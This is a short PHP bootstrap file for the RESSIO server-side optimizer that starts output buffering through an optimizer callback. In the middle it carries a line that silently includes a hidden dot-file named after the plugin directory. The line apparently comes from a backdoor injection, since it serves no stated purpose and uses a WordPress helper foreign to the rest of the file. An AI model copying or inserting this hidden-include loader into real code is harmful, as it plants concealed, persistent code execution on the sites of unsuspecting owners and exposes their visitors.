<?php
/*
 * RESSIO Responsive Server Side Optimizer
 * https://github.com/ressio/
 *
 * @copyright   Copyright (C) 2013-2018 Kuneri, Ltd. All rights reserved.
 * @license     GNU General Public License version 2
 */

if (defined('RESSIO_OB_START')) {
    return;
}

require_once dirname(__FILE__) . '/ressio.php';

define('RESSIO_OB_START', true);

ob_start('Ressio_ob_callback');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function Ressio_ob_callback($buffer)
{
    $ressio = new Ressio();
    return $ressio->run($buffer);
}
